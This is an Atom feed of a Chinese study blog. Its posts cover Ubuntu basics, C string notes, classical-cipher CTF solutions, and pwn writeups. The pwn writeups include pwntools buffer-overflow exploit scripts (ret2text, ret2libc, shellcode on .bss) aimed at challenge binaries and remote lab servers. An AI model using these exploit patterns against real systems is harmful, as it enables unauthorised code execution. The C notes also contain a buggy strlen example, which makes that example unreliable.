<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>蜗牛的小屋</title>
  
  <subtitle>Hexo</subtitle>
  <link href="https://dh15219984801.store/atom.xml" rel="self"/>
  
  <link href="https://dh15219984801.store/"/>
  <updated>2020-11-06T02:38:36.554Z</updated>
  <id>https://dh15219984801.store/</id>
  
  <author>
    <name>Theothershore</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Ubuntu 16.04 文件及文件夹基础操作</title>
    <link href="https://dh15219984801.store/2020/11/30/Ubutun16.04/title%20Ubuntu%2016.04%20%E6%96%87%E4%BB%B6%E5%8F%8A%E6%96%87%E4%BB%B6%E5%A4%B9%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C%20-%20%E5%89%AF%E6%9C%AC/"/>
    <id>https://dh15219984801.store/2020/11/30/Ubutun16.04/title%20Ubuntu%2016.04%20%E6%96%87%E4%BB%B6%E5%8F%8A%E6%96%87%E4%BB%B6%E5%A4%B9%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C%20-%20%E5%89%AF%E6%9C%AC/</id>
    <published>2020-11-30T12:51:13.786Z</published>
    <updated>2020-11-06T02:38:36.554Z</updated>
    
    <content type="html"><![CDATA[<p>​                                                        </p><p><strong>查看文件：cat 路径名</strong></p><p><strong>进入文件夹操作：</strong></p><p>当前位置       cd .</p><p>上一级文件位置 cd ..</p><p>返回上一步操作 cd -</p><p>进入Home文件  cd ~</p><p>显示文件路径   pwd</p><p><strong>文件及文件夹操作：</strong></p><p>创建文件 touch <file></p><p>创建文件夹 mkdir <dir></p><p>创建多重文件夹 mkdir -p <dir></p><p>删除文件 rm <file></p><p>删除文件夹 rmdir <dir></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​                                                        &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;查看文件：cat 路径名&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;进入文件夹操作：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;当前</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>jarvisoj_level5</title>
    <link href="https://dh15219984801.store/2020/11/25/pwn/title%20jarvisoj_level5/"/>
    <id>https://dh15219984801.store/2020/11/25/pwn/title%20jarvisoj_level5/</id>
    <published>2020-11-25T15:50:16.479Z</published>
    <updated>2020-11-25T15:50:16.479Z</updated>
    
    <content type="html"><![CDATA[<p>​                 </p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​                 &lt;/p&gt;
</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>考核Writeup</title>
    <link href="https://dh15219984801.store/2020/11/18/pwn/title%20%E8%80%83%E6%A0%B8Writeup/"/>
    <id>https://dh15219984801.store/2020/11/18/pwn/title%20%E8%80%83%E6%A0%B8Writeup/</id>
    <published>2020-11-18T13:35:11.653Z</published>
    <updated>2020-11-19T05:36:04.237Z</updated>
    
    <content type="html"><![CDATA[<p>​                                                                     </p><h4 id="一-pwn"><a href="#一-pwn" class="headerlink" title="一.pwn"></a>一.pwn</h4><h5 id="1-Girl-friend"><a href="#1-Girl-friend" class="headerlink" title="1.Girl friend"></a>1.Girl friend</h5><p>题目来源：<a href="https://share.weiyun.com/6SVOtJBF">https://share.weiyun.com/6SVOtJBF</a></p><p>本题开启了NX保护<br><img src="https://i.loli.net/2020/11/19/2Gn4dMSswX6N3Cx.png" alt="image.png"></p><p>直接运行，qaq网恋有风险<br><img src="https://i.loli.net/2020/11/19/FQjfdbUexODatW4.png" alt="image.png"></p><p>打开IDA，F5查看c伪代码<br><img src="https://i.loli.net/2020/11/19/To9pqVMRfaNKBQZ.png" alt="image.png"></p><p>并没有很好的思路<br>再shift F12，发现本题有/bin/sh，并且plt表中也有system的地址</p><p><img src="https://i.loli.net/2020/11/19/CEeHFyfmstDWTS8.png" alt="image.png">于是尝试能不能用system（/bin/sh）绕过</p><p><strong>脚本</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(os&#x3D;&#39;linux&#39;,arch&#x3D;&#39;i386&#39;,log_level&#x3D;&#39;debug&#39;)</span><br><span class="line"></span><br><span class="line">pwn &#x3D; process(&#39;.&#x2F;hhhm_want_girl_friend&#39;)</span><br><span class="line"></span><br><span class="line">pwn &#x3D; remote (&quot;47.98.234.232&quot;,28036)</span><br><span class="line"></span><br><span class="line">pwn.recvuntil(&quot;your answer:\n&quot;)</span><br><span class="line"></span><br><span class="line">payload &#x3D;&#39;a&#39;*（0x70+0x4） +p32(0x080483E0)+ p32(0xdeadbeef)+ p32(0x0804A028)</span><br><span class="line"></span><br><span class="line">#payload &#x3D;&#39;a&#39;*110 + p32(system) + p32(0xdeadbeef) + p32(binsh)</span><br><span class="line">#system的内存地址在IDA的plt表直接可见，不用去后门函数那里找，做题的时候卡在这里很久</span><br><span class="line"></span><br><span class="line">pwn.sendline(payload)</span><br><span class="line"></span><br><span class="line">pwn.interactive()</span><br></pre></td></tr></table></figure><p>运气不错成功了</p><p><img src="https://i.loli.net/2020/11/19/d5gIlySZABQGmcH.png" alt="image.png"></p><p>注：本题解法和stackoverflow3类似</p><h5 id="2-signin-stackoverflow"><a href="#2-signin-stackoverflow" class="headerlink" title="2.signin_stackoverflow"></a>2.signin_stackoverflow</h5><p>题目来源：<a href="https://share.weiyun.com/cmSGxipa">https://share.weiyun.com/cmSGxipa</a></p><p>直接运行</p><p><img src="https://i.loli.net/2020/11/19/9xRLAnGQCpomh7l.png" alt="image.png"></p><p>NX保护都没有开启</p><p><img src="https://i.loli.net/2020/11/19/aPSpCD9Mc7OFsGw.png" alt="image.png"></p><p>IDA分析，发现vul函数中有两个read，简单的思路就是先把第一个read填充完，再填充第二个从而get flag</p><p><img src="https://i.loli.net/2020/11/19/lsKC9t1iwypEfzv.png" alt="image.png"></p><p>第一个read只需要填满，但是一开始没看清我加上了偏移量emm</p><p>在vul函数中，变量buf距离栈底的距离为0x1C，而第二个read可以从终端输入最多0x100字节写入到buf中，可见存在栈溢出</p><p>这里利用栈溢出控制指针，再次调用read函数向某地址写入shellcode之后，然后控制指针运行到shellcode。写入地址选择固定地址<strong>bss段</strong>（地址在IDA ctrl+s 查找）</p><p><img src="https://i.loli.net/2020/11/19/vf6XpqeZNYgcrbS.png" alt="image.png"></p><p>给溢出后调用的read函数e传参，覆写eip的read函数地址应该是plt表中read地址，而不是read函数地址。即填入IDA中<code>_read</code>地址，而不是<code>read</code>地址</p><p><img src="https://i.loli.net/2020/11/19/57HEzGqymgRswMQ.png" alt="image.png"></p><p><strong>脚本</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"></span><br><span class="line">pwn = remote (<span class="string">&quot;47.98.234.232&quot;</span>,<span class="number">28040</span>)</span><br><span class="line"></span><br><span class="line">pwn = process(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload =p32(<span class="number">0</span>)+p32(<span class="number">0x0804A080</span>)+p32(len(shellcode))</span><br><span class="line"><span class="comment">#填满第一个read函数，无偏移</span></span><br><span class="line"></span><br><span class="line">pwn.recvuntil(<span class="string">&quot;tell me something:\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">pwn.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pwn.sendline(shellcode),出错点</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span> +p32(<span class="number">0x080483A0</span>)+p32(<span class="number">0X0804a040</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0X0804a040</span>)+p32(len(shellcode))</span><br><span class="line"><span class="comment">#覆写eip的read函数地址应该是plt表中read地址，而不是read函数地址。即填入IDA中_read地址，而不是read地址</span></span><br><span class="line">pwn.sendline(payload)</span><br><span class="line"></span><br><span class="line">pwn.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">pwn.interactive()</span><br></pre></td></tr></table></figure><p>但是该脚本只能在本地运行，远程执行不了，终端显示出错原因应该是远程端口没法打开，不知道怎么解决。</p><p>后续补上</p><h4 id="二-密码学（Crypto）"><a href="#二-密码学（Crypto）" class="headerlink" title="二 密码学（Crypto）"></a>二 密码学（Crypto）</h4><h5 id="小明家的小菜园"><a href="#小明家的小菜园" class="headerlink" title="小明家的小菜园"></a>小明家的小菜园</h5><p><img src="https://i.loli.net/2020/11/19/RmNyLSkxs2U6teg.png" alt="image.png"></p><p><strong>栅栏密码</strong>是一种简单的移动字符位置的加密方法，规则简单，容易破解。栅栏密码的加密方式：把文本按照一定的字数分成多个组，取每组第一个字连起来得到密文1，再取每组第二个字连起来得到密文2……最后把密文1、密文2……连成整段密文。例如：</p><p>明文：栅栏密码加密规则示例<br>每组字数：5</p><p>按照字数先把明文分成：<br>栅栏密码加<br>密规则示例</p><p>先取每组第一个字：栅密<br>再取每组第二个字：栏规<br>……</p><p>最后得到“栅密栏规密则码示加例”。</p><p>解密则反推：<br>密文被分成2个字一组：<br>栅密<br>栏规<br>密则<br>码示<br>加例</p><p>先取每组第一个字：栅栏密码加<br>再取每组第二个字：密规则示例</p><p>最后得到“栅栏密码加密规则示例”。</p><p>提示：当前的栅栏密码程序不删除空格和换行符。</p><ul><li>明文或密文中如果出现连续空格将原样保留，复制到其它地方时连续空格可能会变成一个空格，注意保持原样。</li><li>在进行多行文本（段落）加密时，每行独立进行加密。</li></ul><p><img src="https://i.loli.net/2020/11/19/3CBKpNaLzxqf7gO.png" alt="image.png"></p><h5 id="恺撒将军"><a href="#恺撒将军" class="headerlink" title="恺撒将军"></a>恺撒将军</h5><p><strong>凯撒密码</strong>参考文献：<a href="https://wenku.baidu.com/view/d61f164a02d8ce2f0066f5335a8102d276a2618f">https://wenku.baidu.com/view/d61f164a02d8ce2f0066f5335a8102d276a2618f</a></p><p><strong>特殊情况</strong>：存在@、<code>]</code>、<code>&lt;</code>等标点字符，一般在线解密会略过，因此用脚本就算出偏移。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">strings = <span class="string">&quot;]p&#123;k]6wmfqozgJ&lt;id[QidKkl[6Qy[5YEf6nziT@@&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> strings:</span><br><span class="line">flag += chr(ord(i)<span class="number">-3</span>)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>解密之后得到的是一个<a href="https://baike.sogou.com/v53347.htm?fromTitle=base64">base64加密</a>的密文：ZmxhZ3tjcnlwdG9faXNfaHhiX3NvX2VBc3kwfQ==</p><p>将得到的base64解码，得到flag</p><p><img src="https://i.loli.net/2020/11/19/RPiUeldTyLvsWC2.png" alt="image.png"></p><h5 id="战报"><a href="#战报" class="headerlink" title="战报"></a>战报</h5><p>下载txt打开得到它的明文以及暗文，上字词频率统计网站，找到待解密文的字频统计表，最后还原到明文，得到flag{eantosi}</p><p>需要注意的是明文的字词频率最大的频次是空格，需要跳过。</p><p><img src="https://i.loli.net/2020/11/19/AzDf5m9FENrbMGt.png" alt="image.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​                                                                     &lt;/p&gt;
&lt;h4 id=&quot;一-pwn&quot;&gt;&lt;a href=&quot;#一-pwn&quot; class=&quot;headerlink&quot; title=&quot;一.pw</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>StackOverflow1-5</title>
    <link href="https://dh15219984801.store/2020/11/17/pwn/%E6%A0%88%E6%BA%A2%E5%87%BA%20StackOverflow1-5/"/>
    <id>https://dh15219984801.store/2020/11/17/pwn/%E6%A0%88%E6%BA%A2%E5%87%BA%20StackOverflow1-5/</id>
    <published>2020-11-17T15:51:38.160Z</published>
    <updated>2020-11-25T15:44:42.445Z</updated>
    
    <content type="html"><![CDATA[<p>​                                                                                                                                                        </p><p>题目来源：<a href="http://ctf.mrskye.cn/challenges">http://ctf.mrskye.cn/challenges</a>   </p><h4 id="一-StackOverflow1"><a href="#一-StackOverflow1" class="headerlink" title="一.StackOverflow1"></a>一.StackOverflow1</h4><p>NX保护未开启</p><p><img src="https://i.loli.net/2020/11/19/5Oh324GuxwD8ajR.png" alt="image.png"></p><p>IDA反编译，这里有一个关键函数gets</p><p><img src="https://i.loli.net/2020/11/19/VxmXLnKNIaW7HrZ.png" alt="image.png"></p><p>gets的功能：从stdin流中读取<a href="https://baike.baidu.com/item/%E5%AD%97%E7%AC%A6%E4%B8%B2">字符串</a>，直至接受到换行符或<a href="https://baike.baidu.com/item/EOF">EOF</a>时停止，并将读取的结果存放在buffer<a href="https://baike.baidu.com/item/%E6%8C%87%E9%92%88">指针</a>所指向的字符<a href="https://baike.baidu.com/item/%E6%95%B0%E7%BB%84">数组</a>中。换行符不作为读取串的内容，读取的换行符被转换为‘\0’空字符，并由此来结束字符串。补充：<a href="https://baike.baidu.com/item/gets">https://baike.baidu.com/item/gets</a></p><p>但是这里并不能通过简单的输入数据造成栈溢出，通过观察发现本题的got表有一个getshell函数，所以我们也可以通过system(“/bin/sh”)来夺取shell的权限</p><p><img src="https://i.loli.net/2020/11/19/8iphz1PWOe65dFD.png" alt="image.png"></p><h6 id="playload"><a href="#playload" class="headerlink" title="playload"></a>playload</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#导入pwntools</span></span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&quot;debug&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,arch=<span class="string">&quot;i386&quot;</span>)</span><br><span class="line"></span><br><span class="line">pwn = process(<span class="string">&quot;./stackoverflow1&quot;</span>)</span><br><span class="line"><span class="comment">#载入程序</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#pwn = remote(&quot;49.234.71.236&quot;,28681)</span></span><br><span class="line"><span class="comment">#链接远程服务器</span></span><br><span class="line"></span><br><span class="line">pwn.recvuntil(<span class="string">&quot;input:&quot;</span>)</span><br><span class="line"><span class="comment">#接收程序显示出来的字符串，直至运行到gets函数</span></span><br><span class="line"></span><br><span class="line">Addr = <span class="number">0x080485B1</span></span><br><span class="line"><span class="comment">#找到getshell的地址</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span>*<span class="number">0x6c</span> + <span class="string">&#x27;A&#x27;</span>*<span class="number">0x4</span> + p32(Addr)</span><br><span class="line"><span class="comment">#用任意字符填充到EIP上，再注入打包好的getshell的地址</span></span><br><span class="line"></span><br><span class="line">pwn.sendline(payload)</span><br><span class="line"><span class="comment">#向程序输入一行数据（payload）</span></span><br><span class="line"></span><br><span class="line">pwn.interactive()</span><br><span class="line"><span class="comment">#将程序控制权交给用户，相当于自用运行</span></span><br></pre></td></tr></table></figure><p>最后终端执行脚本cat  flag即可。</p><h4 id="二-StackOverflow2"><a href="#二-StackOverflow2" class="headerlink" title="二.StackOverflow2"></a>二.StackOverflow2</h4><p>NX保护开启了，因此不能在栈上运行shellcode</p><p><img src="https://i.loli.net/2020/11/19/nfbkNx2cqTtyQMO.png" alt="image.png"></p><p>IDA反编译，这里有一个vul函数</p><p><img src="https://i.loli.net/2020/11/19/kCNpfgTKGQ1hDV2.png" alt="image.png"></p><p>​    我们可以通过0x12345678来覆盖变量v2的地址</p><table><thead><tr><th>栈的简单空间图</th></tr></thead><tbody><tr><td>ESP(存放栈顶指针)</td></tr><tr><td>s的地址</td></tr><tr><td>……</td></tr><tr><td>v2的地址</td></tr><tr><td>……</td></tr><tr><td>EBP(存放栈底指针)</td></tr><tr><td>EIP(下一条指令内存地址)</td></tr></tbody></table><p>ESP到EBP占据0x70的空间，v2到EBP占据0xC的空间</p><p>并且题目有gets函数，可以让我们从s处写入数据</p><p>可以用recvuntil函数接收到gets函数</p><p>然后注入填充字符直到v2的位置</p><p>再将打包好的0x12345678注入</p><p>让程序实行system(“/bin/sh”)</p><p>从而夺取shell的权限</p><h6 id="playload-1"><a href="#playload-1" class="headerlink" title="playload"></a>playload</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&quot;debug&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,arch=<span class="string">&quot;i386&quot;</span>)</span><br><span class="line"></span><br><span class="line">pwn = process(<span class="string">&quot;./stackoverflow2&quot;</span>)</span><br><span class="line"></span><br><span class="line">pwn = remote(<span class="string">&quot;49.234.71.236&quot;</span>,<span class="number">28266</span>)</span><br><span class="line"></span><br><span class="line">pwn.recvuntil(<span class="string">&quot;input:\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">Addr = <span class="number">0x12345678</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span>*<span class="number">100</span> + p32(Addr)</span><br><span class="line"></span><br><span class="line">pwn.sendline(payload)</span><br><span class="line"></span><br><span class="line">pwn.interactive()</span><br></pre></td></tr></table></figure><p>最后cat flag</p><p><img src="https://i.loli.net/2020/11/25/CsLEVUd3jPIO758.png" alt="image.png"></p><h4 id="三-StackOverflow3"><a href="#三-StackOverflow3" class="headerlink" title="三.StackOverflow3"></a>三.StackOverflow3</h4><p>NX保护未开启</p><p><img src="https://i.loli.net/2020/11/25/uRD37MkQop2aCUz.png" alt="image.png"></p><p>IDA反编译，这里也有一个vul函数比较奇怪</p><p><img src="https://i.loli.net/2020/11/25/LleP6aupFsYmGiq.png" alt="image.png"></p><p>有gets函数可以断定是栈溢出，偏移量为0x6c+0x4，除此之外vul没有其他可用信息。</p><p>查看plt表发现system地址已经给出，再shift F12，发现本题给出/bin/sh，所以可以用system（/bin/sh）去get flag</p><p><img src="https://i.loli.net/2020/11/25/1RKTnCdNEzlpOPm.png" alt="image.png"></p><p><strong>脚本</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#导入pwntools</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./stackoverflow3&quot;</span>)</span><br><span class="line"><span class="comment">#载入程序</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = remote(&quot;49.234.71.236&quot;,28178)</span></span><br><span class="line"><span class="comment">#链接远程服务器</span></span><br><span class="line"></span><br><span class="line">system = <span class="number">0x080483D0</span></span><br><span class="line"><span class="comment">#system的地址,看plt表</span></span><br><span class="line"></span><br><span class="line">binsh = <span class="number">0x08048650</span></span><br><span class="line"><span class="comment">#/bin/sh的地址</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;input:&quot;</span>)</span><br><span class="line"><span class="comment">#接收程序显示出来的字符串，直至运行到gets函数</span></span><br><span class="line"></span><br><span class="line">payload =<span class="string">&#x27;a&#x27;</span>*<span class="number">112</span> + p32(system) + p32(<span class="number">0xdeadbeef</span>) + p32(binsh)</span><br><span class="line"><span class="comment">#32位栈传参，0xdeadbeef可以填写任意较大的值，去填充相应的内存</span></span><br><span class="line"><span class="comment">#用任意字符填充到eip寄存器位置，然后填入system的地址，填入一个任意跳转的位置然后给system传入一个参数（栈传参）</span></span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="comment">#向程序输入payload，但是这里要使用send函数来输入，不能使用sendline函数</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment">#将程序控制权交给用户，相当于自用运行</span></span><br></pre></td></tr></table></figure><p>运行脚本getflag</p><p><img src="https://i.loli.net/2020/11/25/Dk3oZE8jsBCVaXI.png" alt="image.png"></p><h4 id="四-StackOverflow4"><a href="#四-StackOverflow4" class="headerlink" title="四.StackOverflow4"></a>四.StackOverflow4</h4><p>stackoverflow4除了没有后面函数/bin/sh的地址外其他基本和stackoverflow3一样<br>但是在plt表中给出了get函数的地址 </p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​                                                                                                                                        </summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>字符串</title>
    <link href="https://dh15219984801.store/2020/11/11/c%E8%AF%AD%E8%A8%80/title%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
    <id>https://dh15219984801.store/2020/11/11/c%E8%AF%AD%E8%A8%80/title%E5%AD%97%E7%AC%A6%E4%B8%B2/</id>
    <published>2020-11-11T09:44:15.395Z</published>
    <updated>2020-11-30T12:34:15.612Z</updated>
    
    <content type="html"><![CDATA[<p>​                                                                                                                                                        </p><p>Printf(“\        #结尾加\可以表示下一行还是这一行的字符量</p><p>”)</p><p>“这一段话c语言会自动形成一个字符串数组，结尾以0或‘\0’ 结尾”：字符串是一个数组，以0或”\0”结尾</p><p>指针字符串和数组字符串的区别</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Char *p=”Hello word”; <span class="comment">//p指向代码段中的一段地址存放字符串，只读不可修改</span></span><br><span class="line"></span><br><span class="line">Char p[]=”Hello word;<span class="comment">//p数组可读可修改</span></span><br></pre></td></tr></table></figure><p>代码段在比较小的地址里，而数组的地址放在比较远的地址里</p><h2 id="数组字符串和指针字符串的用处"><a href="#数组字符串和指针字符串的用处" class="headerlink" title="数组字符串和指针字符串的用处"></a>数组字符串和指针字符串的用处</h2><p>1、数字字符串</p><ul><li>没啥用</li></ul><p>2、指针字符串</p><ul><li><p>处理参数</p></li><li><p>动态分配空间</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> <span class="built_in">string</span>[<span class="number">10</span>];</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%7s&quot;</span>,<span class="built_in">string</span>) <span class="comment">// 数组名称就是其第一个元素的地址</span></span><br><span class="line">    <span class="comment">// scanf里数组可以不用加&amp;符号</span></span><br><span class="line">    <span class="comment">// scanf读字符 直到空格或回车或tab为止</span></span><br><span class="line">    </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%7s&quot;</span>,<span class="built_in">string</span>);<span class="comment">//直接打印出string里的字符串直&#x27;\0&#x27;</span></span><br></pre></td></tr></table></figure><p>%7s表示字符串只处理7个字符，这样的话输入的字符就不会超出定义的字符，保证程序安全。```</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//指针字符串的错误示范</span></span><br><span class="line"><span class="keyword">char</span> *<span class="built_in">string</span>;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,<span class="built_in">string</span>);</span><br></pre></td></tr></table></figure><ul><li>错因：没有初始化指针字符串</li><li>string不是字符串类型，只是一个指向一个char类型的地址罢了</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> **p;</span><br><span class="line"><span class="keyword">char</span> a[][n ];<span class="comment">//n一定要定义</span></span><br><span class="line"><span class="keyword">char</span> *a[]</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/11/30/Rkt3GjlUhFDCybI.png" alt="image.png"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> <span class="keyword">const</span> *argv[])</span> <span class="comment">//在unix系统上有用，不太懂的一个知识点</span></span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">putchar</span><span class="params">(<span class="keyword">int</span> c)</span></span>;<span class="comment">//参数和返回值都是整型</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getchar</span><span class="params">(<span class="keyword">void</span>)</span></span>;<span class="comment">//参数不做限制，返回值是整型</span></span><br></pre></td></tr></table></figure><ul><li><h2 id="用户-shell-程序"><a href="#用户-shell-程序" class="headerlink" title="用户 shell 程序"></a>用户 shell 程序</h2></li></ul><p><img src="https://i.loli.net/2020/11/30/JINVTQSFPBdUovp.png" alt="image.png"></p><p>shell是桥梁，用户输入输入数据给shell，shell放到它的缓冲区里，经过处理后发给程序运行。</p><ul><li><p>ctrl+c：shell 把程序关闭了</p></li><li><p>ctrl+d||ctrl+z：Unix or windows EOF</p><p>​    shell给程序返回一个EOF</p></li></ul><h2 id="string-h"><a href="#string-h" class="headerlink" title="string.h"></a>string.h</h2><h4 id="size-t-strlen-const-char-s"><a href="#size-t-strlen-const-char-s" class="headerlink" title="size_t strlen(const char*s);"></a>size_t strlen(const char*s);</h4><ul><li>作用：求出字符串数组的大小（不包括’\0’。</li><li>strlen(数组名);</li><li>const的意义是数组不会被修改</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">strlen</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *s)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> idx=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(s[idx]!=<span class="string">&#x27;\0&#x27;</span>)&#123;</span><br><span class="line">        idx++;</span><br><span class="line">        <span class="keyword">return</span> idx;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>int strcmp(const char *s1,const char *s2); (cmp是compare的意思)</li><li>比较两个字符串</li></ul><p>a[]==b[]: ==判断数组的地址是否相等，而不是内容。</p><h4 id="strcmp"><a href="#strcmp" class="headerlink" title="strcmp"></a>strcmp</h4><figure class="highlight c"><table><tr><td 